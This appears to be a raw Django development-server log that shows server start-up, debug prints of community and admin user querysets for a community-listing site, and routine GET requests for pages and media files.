Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
<QuerySet []>
[]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
[19/Dec/2018 16:24:24] "GET / HTTP/1.1" 200 22782
[19/Dec/2018 16:24:25] "GET /media/media/logo.png HTTP/1.1" 200 11255
[19/Dec/2018 16:24:27] "GET /media/media/1.png HTTP/1.1" 200 217917
[19/Dec/2018 16:24:29] "GET /media/media/2.png HTTP/1.1" 200 218829
[19/Dec/2018 16:24:29] "GET /media/media/3.png HTTP/1.1" 200 62062
[19/Dec/2018 16:24:33] "GET /media/media/13071833_1194304533913237_5604740049536472095_o.jpg HTTP/1.1" 200 374377
[19/Dec/2018 16:24:34] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 200 80581
[19/Dec/2018 16:24:34] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[19/Dec/2018 16:24:35] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[19/Dec/2018 16:24:51] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:24:52] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 304 0
[19/Dec/2018 16:25:00] "GET /community/5 HTTP/1.1" 301 0
[19/Dec/2018 16:25:01] "GET / HTTP/1.1" 200 23561
[19/Dec/2018 16:25:02] "GET /media/media/46831530_10215805946675011_2067582095059845120_n.jpg HTTP/1.1" 304 0
[19/Dec/2018 16:25:02] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[19/Dec/2018 16:25:03] "GET /community/5/ HTTP/1.1" 200 15799
[19/Dec/2018 16:25:09] "GET /community/5/ HTTP/1.1" 200 15799
[19/Dec/2018 16:43:18] "GET / HTTP/1.1" 301 0
[19/Dec/2018 16:44:15] "GET / HTTP/1.1" 301 0
Validating models...

System check identified no issues (0 silenced).
December 19, 2018 - 16:24:21
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: Noida Cycling Club (NCC)>, <Community: Gurgaon Road Runners>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: Noida Cycling Club (NCC)>]>
3
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
12
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Nipun Goyal>]
Performing system checks...

System check identified no issues (0 silenced).
December 19, 2018 - 16:24:11
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
